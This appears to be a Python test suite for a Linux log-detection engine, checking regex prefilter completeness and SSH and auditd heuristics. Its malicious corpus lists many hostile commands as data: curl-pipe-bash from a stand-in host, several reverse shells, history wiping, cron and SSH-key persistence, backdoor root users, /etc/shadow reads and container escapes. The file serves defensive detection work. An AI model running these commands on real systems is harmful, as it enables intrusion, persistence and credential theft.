from __future__ import annotations

# ruff: noqa: E402
#
# Regression coverage for the Linux command-line detections and auth heuristics.
# Mirrors test_cmdline_detections_corpus: asserts _check_linux_cmdline produces
# exactly what a reference full-pattern-loop (no prefilter) does across a corpus
# that hits every pattern family plus benign near-misses. This guarantees the
# _LINUX_CMDLINE_PREFILTER_RE never hides a real match (prefilter completeness).

import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest.mock import patch


class _BaseModel:
    def __init__(self, **kwargs):
        for key, value in kwargs.items():
            setattr(self, key, value)

    @classmethod
    def model_validate(cls, data):
        return cls(**data)

    def model_dump_json(self, indent=None):
        return "{}"


sys.modules.setdefault("keyring", types.SimpleNamespace(
    get_password=lambda *_a, **_k: None,
    set_password=lambda *_a, **_k: None,
    delete_password=lambda *_a, **_k: None,
    errors=types.SimpleNamespace(PasswordDeleteError=Exception),
))
sys.modules.setdefault("pydantic", types.SimpleNamespace(
    BaseModel=_BaseModel,
    Field=lambda default=None, default_factory=None, **_k: default_factory() if default_factory else default,
))

from sqlalchemy import select
from app.detect import engine
from app.detect.rules import LINUX_SUSPICIOUS_CMDLINE_PATTERNS
from app.ingest.parsers import parse_file
from app.store import cases, database
from app.store.database import Finding


# One malicious line per pattern family (a few lines legitimately hit two rules,
# e.g. a bash -i /dev/tcp reverse shell also matches the raw-socket rule).
_MALICIOUS = [
    "curl http://evil.example/p.sh | bash",
    "wget -O /tmp/x http://evil.example/x",
    "curl -o /tmp/x http://evil.example/x",
    "chmod +x /tmp/evil",
    "cat blob | base64 -d | bash",
    "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmxvYg== | base64 -d",
    "bash -i >& /dev/tcp/1.2.3.4/443 0>&1",
    "exec 5<>/dev/tcp/10.0.0.9/9001",
    "nc -e /bin/sh 1.2.3.4 4444",
    "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 >/tmp/f",
    "python -c 'import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)'",
    "perl -e 'use Socket;connect(S,...);exec(\"/bin/sh\")'",
    "socat tcp:1.2.3.4:443 exec:/bin/sh",
    "history -c",
    "unset HISTFILE",
    "rm -f /root/.bash_history",
    "echo '* * * * * /tmp/evil' >> /etc/crontab",
    "echo 'ssh-rsa AAAAB3Nz' >> /root/.ssh/authorized_keys",
    "echo /tmp/evil.so >> /etc/ld.so.preload",
    "useradd -o -u 0 backdoor",
    "usermod -aG sudo bob",
    "systemctl enable evil.service",
    # Additional reverse shells / interpreters
    'php -r \'$s=fsockopen("1.2.3.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
    'ruby -rsocket -e \'c=TCPSocket.new("1.2.3.4",4444);exec "/bin/sh -i"\'',
    "awk 'BEGIN{s=\"/inet/tcp/0/1.2.3.4/4444\"}'",
    "curl http://evil.example/x.sh | sudo bash",
    "wget -qO- http://evil.example/x.py | python3",
    # Supply chain / git
    "pip install git+http://evil.example/pkg.git",
    "npm install https://evil.example/pkg.tgz",
    "npx http://evil.example/pkg",
    "git clone http://1.2.3.4/repo.git",
    "git config core.hookspath /tmp/hooks",
    # Tunneling / pivoting
    "ssh -R 8080:127.0.0.1:80 user@1.2.3.4",
    "ssh -D 1080 user@1.2.3.4 -N -f",
    "chisel client 1.2.3.4:8080 r:socks",
    "ngrok tcp 22",
    # Defense evasion
    "setenforce 0",
    "iptables -F",
    "chattr +i /tmp/evil",
    # Persistence
    "echo '* * * * * /tmp/x' | crontab -",
    "echo '/tmp/implant &' >> /root/.bashrc",
    "LD_PRELOAD=/tmp/evil.so /bin/ls",
    # Credential access / cloud / container
    "cat /etc/shadow",
    "find / -name id_rsa 2>/dev/null",
    "python3 mimipenguin.py",
    "curl http://169.254.169.254/latest/meta-data/",
    "nsenter --target 1 --mount --net --pid -- /bin/bash",
    "docker run --privileged -v /:/host alpine",
]

_BENIGN = [
    "curl https://api.example.com -o report.json",
    "chmod +x ./gradlew",
    "history",
    "man nc",
    "systemctl enable ssh",
    "systemctl enable sshd.service",
    "python train.py --epochs 5 --lr 0.01",
    "echo hello > /tmp/notes.txt",
    "wget https://example.com/file.tar.gz",
    "cat /var/log/syslog | grep error",
]


def _reference_check(text: str):
    """Findings the full Linux pattern loop would emit (no prefilter)."""
    lower = text.lower()
    out = []
    for regex, technique, description, severity in LINUX_SUSPICIOUS_CMDLINE_PATTERNS:
        if regex.search(lower):
            out.append((description, severity, technique))
    return sorted(out)


class LinuxCmdlineCorpusTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.patches = [
            patch.object(cases, "get_cases_dir", return_value=self.root),
            patch.object(cases, "case_db_path", side_effect=lambda cid: self.root / cid / "case.db"),
        ]
        for p in self.patches:
            p.start()

    def tearDown(self) -> None:
        database.dispose_all_db_engines()
        for p in reversed(self.patches):
            p.stop()
        self.tmp.cleanup()

    def test_prefilter_completeness(self) -> None:
        # _check_linux_cmdline (prefilter + list) must match the reference (list
        # only) on every line, malicious and benign.
        for line in _MALICIOUS + _BENIGN:
            case = cases.create_case("lx")
            session = cases.get_session(case["id"])
            try:
                got = engine._check_linux_cmdline(session, set(), line, {"entity": line[:50]}, "test")
                session.commit()
                findings = sorted(
                    (f.title, f.severity, f.mitre_techniques[0])
                    for f in session.scalars(select(Finding))
                )
            finally:
                session.close()
            ref = _reference_check(line)
            self.assertEqual(findings, ref, f"prefilter hid a match on {line!r}")
            self.assertEqual(got is None, not ref, f"top-severity None-ness mismatch on {line!r}")

    def test_every_pattern_is_exercised(self) -> None:
        # Coverage: every pattern's description is produced by some malicious line.
        produced: set[str] = set()
        for line in _MALICIOUS:
            produced.update(d for d, _s, _t in _reference_check(line))
        all_descriptions = {desc for _r, _t, desc, _s in LINUX_SUSPICIOUS_CMDLINE_PATTERNS}
        self.assertEqual(all_descriptions - produced, set(),
                         "some LINUX cmdline patterns are never exercised by the corpus")

    def test_benign_lines_emit_nothing(self) -> None:
        for line in _BENIGN:
            self.assertEqual(_reference_check(line), [], f"{line!r} unexpectedly matched")


class LinuxAuthHeuristicTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.patches = [
            patch.object(cases, "get_cases_dir", return_value=self.root),
            patch.object(cases, "case_db_path", side_effect=lambda cid: self.root / cid / "case.db"),
        ]
        for p in self.patches:
            p.start()

    def tearDown(self) -> None:
        database.dispose_all_db_engines()
        for p in reversed(self.patches):
            p.stop()
        self.tmp.cleanup()

    def _detect(self, body: str, name: str = "auth.log") -> set[str]:
        case = cases.create_case("lx")
        cid = case["id"]
        p = self.root / name
        p.write_text(body)
        session = cases.get_session(cid)
        try:
            rows = [
                {k: e[k] for k in ("timestamp", "host", "source", "category",
                                   "entity", "severity", "summary", "raw")}
                for e in parse_file(p, name)
            ]
            cases.add_events_bulk(session, rows)
            session.commit()
        finally:
            session.close()
        engine.run_detections_sync(cid)
        session = cases.get_session(cid)
        try:
            return {f.title for f in session.scalars(select(Finding))}
        finally:
            session.close()

    def test_ssh_brute_force_followed_by_success(self) -> None:
        lines = [f"Jul 12 05:0{i % 10}:22 web01 sshd[1]: Failed password for admin "
                 f"from 203.0.113.5 port 4000 ssh2" for i in range(12)]
        lines.append("Jul 12 05:20:00 web01 sshd[2]: Accepted password for admin "
                     "from 203.0.113.5 port 5001 ssh2")
        titles = self._detect("\n".join(lines) + "\n")
        self.assertTrue(any("Brute force followed by successful login" in t for t in titles),
                        f"expected brute-force-then-success, got {titles}")

    def test_success_before_failure_campaign_is_not_completed_brute_force(self) -> None:
        lines = [
            "Jul 12 05:00:00 web01 sshd[1]: Failed password for admin from 203.0.113.5 port 4000 ssh2",
            "Jul 12 05:01:00 web01 sshd[2]: Accepted password for admin from 203.0.113.5 port 5001 ssh2",
        ]
        lines.extend(
            f"Jul 12 05:{minute:02d}:00 web01 sshd[{minute}]: Failed password for admin "
            "from 203.0.113.5 port 4000 ssh2"
            for minute in range(2, 11)
        )
        titles = self._detect("\n".join(lines) + "\n")
        self.assertFalse(any("Brute force followed by successful login" in t for t in titles),
                         f"pre-campaign success was treated as compromise: {titles}")
        self.assertTrue(any("Authentication brute force attempts" in t for t in titles), titles)

    def test_auditd_add_user_emits_account_creation_finding(self) -> None:
        body = ('type=ADD_USER msg=audit(1752300050.5:901): pid=3001 uid=0 '
                'msg=\'op=add-user acct="backdoor" exe="/usr/sbin/useradd" '
                'hostname=? addr=? res=success\'\n')
        titles = self._detect(body, "audit.log")
        self.assertIn("Linux user account created: backdoor", titles)

    def test_root_login_from_public_ip(self) -> None:
        body = "Jul 12 05:21:00 web01 sshd[3]: Accepted password for root from 198.51.100.9 port 5002 ssh2\n"
        titles = self._detect(body)
        self.assertTrue(any(t.startswith("Root login") for t in titles), f"got {titles}")

    def test_privileged_group_add(self) -> None:
        body = "Jul 12 05:22:00 web01 usermod[4]: add 'bob' to group 'sudo'\n"
        titles = self._detect(body)
        self.assertTrue(any("privileged group" in t for t in titles), f"got {titles}")


if __name__ == "__main__":
    unittest.main()
